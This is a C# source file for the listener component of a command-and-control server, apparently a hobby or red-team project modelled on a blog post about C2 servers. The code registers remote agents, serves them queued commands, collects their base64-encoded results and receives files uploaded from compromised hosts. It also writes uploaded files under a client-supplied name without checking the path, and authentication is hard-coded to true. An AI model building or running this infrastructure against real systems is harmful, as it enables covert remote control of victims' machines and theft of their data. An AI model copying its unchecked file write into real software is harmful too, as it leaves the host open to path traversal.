using System;
using System.Collections.Generic;
using System.Net;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Threading.Tasks;

/*
    The Listener class is the main class for the server.
    It handles all the communication with the clients.
*/


namespace server{
   //This class is inspired from this blog:
    //https://0xrick.github.io/misc/c2/#about-c2-servers--agents
    public class Listener{
        private string path {get; set;}
        private string keyPath {get; set;}
        private string filePath {get; set;}
        public string logPath {get; set;}
        public string agentsPath {get; set;}
        public string pluginPath {get; set;}
        public string playbookPath {get; set;}
        public string Name {get; set;}
        public int Port {get; set;}
        public string Ipaddress {get; set;}
        public string key {get; set;}
        public Dictionary<string, Agent> agents{get; set;}
        //dictionary with refrences to the paths to plugins
        public Dictionary<string, Plugin> pluginDict{get; set;}
        private HttpListener _listener;

        public Listener(string name, int port, string ipaddress){
            //Constructor for the Listener object. 
            //Listener is the main class of the server
            //and handles connections with clients
            this.Name = name;
            this.Port = port;
            this.Ipaddress = ipaddress;

            this.path = $"data/listeners/{this.Name}/";
            this.keyPath = $"{this.path}key";
            this.filePath = $"{this.path}files/";
            this.logPath = $"{this.path}logs/";
            this.agentsPath = $"{this.path}agents/";
            this.pluginPath = $"{this.path}plugins/";
            this.pluginDict = new Dictionary<string, Plugin>();
            this.playbookPath = $"{this.path}playbooks/";
            this.agents = new Dictionary<string, Agent>();

            //Create the paths defined above if they don't already exist
            Directory.CreateDirectory(this.path);
            Directory.CreateDirectory(this.filePath);
            Directory.CreateDirectory(this.logPath);
            Directory.CreateDirectory(this.agentsPath);
            Directory.CreateDirectory(this.pluginPath);
            Directory.CreateDirectory(this.playbookPath);

            //will need to generate a key in this location
            File.Create(this.keyPath);

            //this.key = generateKey();
            _listener = new HttpListener();
        }

        public void StartServer(){
            //start our server on the specified IP and port
            string url = $"http://{Ipaddress}:{Port}/";
            _listener.Prefixes.Add(url);
            _listener.Start();
            //check if our server is listening
            if (_listener.IsListening){
                LogServer($"Server is listening at {url}");
            } else {
                string log = $"Server failed to start at {url}";
                Console.WriteLine(log);
                LogServer(log);
            }
        }

        public void Terminate(){
            //stop our listener
            _listener.Stop();
        }

        public void LoadPlugins(){
            //on startup, load available plugins from the plugin folder
            string[] plugins = Directory.GetFiles(this.pluginPath, "*.dll");
            
            foreach(string pluginFile in plugins){
                LogServer(pluginFile);
                //load configs for the plugins and make plugin objects
                string pluginName = pluginFile.Split('/').Last().Split('.').First();
                string plo = null;
                try{
                    plo = File.ReadAllText($"{this.pluginPath}{pluginName}.json");
                } catch {
                    Console.WriteLine($"Cannot find options for {pluginName} in {this.pluginPath}.");
                    continue;
                } 
                //Console.WriteLine(plo);
                var plug = JsonSerializer.Deserialize<Plugin>(plo);
                plug.Path = pluginFile;
                //add to the plugin dict
                this.pluginDict.Add(plug.Name, plug);
                LogServer($"{plug.Name} loaded to an object");
            }
           /* 
            foreach(string pluginFile in plugins){
                //add the plugins to the plugin dict
                LogServer(pluginFile);
                //add the name as the key and the path as the value
                string[] pluginName = pluginFile.Split('/');
                this.pluginDict.Add(pluginName.Last(), pluginFile);
            }
            */
        }

        public void LoadRegisteredClients(){
            //on startup, the server will need to load any agents that have
            //already been registered
            string[] agents = Directory.GetFiles(this.agentsPath);
            foreach(string agentFile in agents){
                StreamReader reader = File.OpenText(agentFile);
                try {
                    //load an agent from disk 
                    string line = reader.ReadLine();
                    Agent loadAgent = JsonSerializer.Deserialize<Agent>(line);
                    this.agents.Add(loadAgent.name, loadAgent);
                    LogServer($"Loading {loadAgent.name} into memory");
                } catch (Exception e){
                    Console.WriteLine("exception: " + e);
                }
            }
        }

        public async Task ListenAndRespond(){
            //The main method of this class
            //per https://learn.microsoft.com/en-us/dotnet/api/system.net.httplistener?view=net-6.0
            //and https://gist.github.com/define-private-public/d05bc52dd0bed1c4699d49e2737e80e7
            while(true){
                //Get our context asynchronously
                HttpListenerContext context = await _listener.GetContextAsync();
                HttpListenerRequest request = context.Request;

                //read client data
                Stream body = request.InputStream;
                System.Text.Encoding encoding = request.ContentEncoding;
                StreamReader reader = new System.IO.StreamReader(body, encoding);
                JsonDocument clientData = JsonDocument.Parse(reader.ReadToEnd());

                // Construct a response.
                HttpListenerResponse response = context.Response;
                string responseString = await RespondToClient(clientData);
                byte[] buffer = System.Text.Encoding.UTF8.GetBytes(responseString);

                // Get a response stream and write the response to it.
                response.ContentLength64 = buffer.Length;

                //write our response string to the client using the outputstream
                System.IO.Stream output = response.OutputStream;
                output.Write(buffer,0,buffer.Length);
            }
            // You must close the output stream.
            //Console.WriteLine("Listener Closed");
            //output.Close();
        }

        private async Task<string> RegisterClient(JsonElement hostname, JsonElement root){
            //register the agent
            int registration = await RegisterAgent(hostname, root);
            if (registration == 0){
                return Base64EncodeString("{\"registered\":\"true\"}");
            } 
            return "{\"registered\":\"false\"}";
        }

        private string HandleCommand(JsonElement hostname, JsonElement root){
            //respond to the client who wants their commandQue
            LogServer($"command query from {hostname}");
            if (this.agents.TryGetValue(hostname.GetString(), out Agent agent)){
                var jsonCommandQue = JsonSerializer.Serialize(agent.commandQue);
                agent.commandQue.Clear();
                return Base64EncodeString(FormatCommand(jsonCommandQue));
            }
            return "{\"response\": \"Client not found!\"}";
        }

        public async Task<string> RespondToClient(JsonDocument clientData){
            //will construct a response string to send to the client based on requests
            //if the request is looking for a new command
            JsonElement root = clientData.RootElement;
            JsonElement hostname = root.GetProperty("hostname");
            //attempt to register the client based off of request
            //check if the property exists

            if (root.TryGetProperty("register", out JsonElement register)){
                return await RegisterClient(hostname, root);

            } else if (root.TryGetProperty("command", out JsonElement query)){
                return HandleCommand(hostname, root);

            } else if (root.TryGetProperty("response", out JsonElement response)) {
                //get and parse a client response
                this.agents[hostname.GetString()].commandResp.Add(Base64DecodeString(response.ToString()));
                return Base64EncodeString("{\"response\": \"thanks\"}");

            } else if (root.TryGetProperty("file", out JsonElement fileinfo)){
                JsonElement filename = root.GetProperty("filename");
                // this.filePath
                byte[] bytes = Convert.FromBase64String(fileinfo.GetString());
                File.WriteAllBytes($"{this.filePath}/{filename.GetString()}", bytes);

                this.agents[hostname.GetString()].commandResp.Add($"File received and written to {this.filePath}/{filename.GetString()}");
                return Base64EncodeString("{\"response\": \"thanks for the file\"}");

            } else {
                return HttpStatusCode.NotFound.ToString();
            }
        }

        private async Task<int> RegisterAgent(JsonElement hostname, JsonElement root){
            //register an agent if they arent already registered
            //return 0 on register
            //return 1 if already registered
            string filePath = $"data/listeners/{this.Name}/agents/{hostname.GetString()}.json";
            //check if the agent is authorized
            bool auth = true;
            //Register the agent if it is not already registered
            if (auth){
                if(!File.Exists(filePath)){
                    //create the file if it exists
                    LogServer($"Registering {hostname.GetString()}");
                    //write the data sent by the new agent to a file

                    //we'll need to recieve the ip on register
                    //create a new Agent to store the information of the agents in memory
                    Agent newAgent = new Agent(hostname.GetString(), "127.0.0.1");
                    this.agents.Add(hostname.GetString(), newAgent);
                    await File.AppendAllTextAsync(filePath, JsonSerializer.Serialize(newAgent));
                    return 0;
                } else {
                    //should eventually affirm to the client that they are registered
                    LogServer($"Query by {hostname}");
                    return 1;
                }
            }
            return 1;
        }

        private string FormatCommand(string commands){
            //takes in a command and formats it for the client
            return "{\"commands\": " + commands + "}";
        }

        public string Base64EncodeFile(string path){
            //takes a path and returns a base64 encoded file
            Byte[] bytes = File.ReadAllBytes(path);
            return Convert.ToBase64String(bytes);
        }
        private string Base64EncodeString(string str){
            //takes a string and returns it in base64
            return Convert.ToBase64String(Encoding.ASCII.GetBytes(str));
        }
        private string Base64DecodeString(string str){
            //takes a base64 string and returns the decoded string
            var b_base64 = Convert.FromBase64String(str);
            return Encoding.UTF8.GetString(b_base64);
        }

        private void LogServer(string log){
            //writes to a log file for the listener
            //create the file if it doesnt exist
            string path = $"{this.logPath}/log.txt";
            if (!File.Exists(path))
                File.Create(path);
           
            using (StreamWriter sw = File.AppendText(path)){
                sw.WriteLine(log);
            }
        }
    }
}
 